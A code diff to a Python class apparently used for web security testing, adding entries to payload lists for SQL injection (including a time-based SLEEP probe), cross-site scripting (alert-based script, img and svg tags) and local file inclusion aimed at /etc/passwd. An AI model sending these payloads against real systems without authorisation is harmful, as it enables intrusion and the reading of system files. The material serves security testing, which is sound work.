@@ -12,8 +12,9 @@ class Kljucar:
                     "name": "SQL Injection",
                     "payloads": [
                         "' OR 1=1 --",
-                        "' UNION SELECT NULL, NULL --",
-                        "\" OR \"\" = \"\"",
+                        "' UNION SELECT NULL,NULL --",
+                        "' AND SLEEP(5) --",
+                        "' OR 'a'='a"
                     ]
                 })
             elif modul == "XSS":
@@ -22,6 +23,7 @@ class Kljucar:
                     "payloads": [
                         "<script>alert(1)</script>",
                         "<img src=x onerror=alert(1)>",
+                        "<svg/onload=alert(1)>"
                     ]
                 })
             elif modul == "LFI":
@@ -30,6 +32,7 @@ class Kljucar:
                     "payloads": [
                         "../../etc/passwd",
                         "../../../../../../etc/passwd",
+                        "/etc/passwd"
                     ]
                 })
         return plan
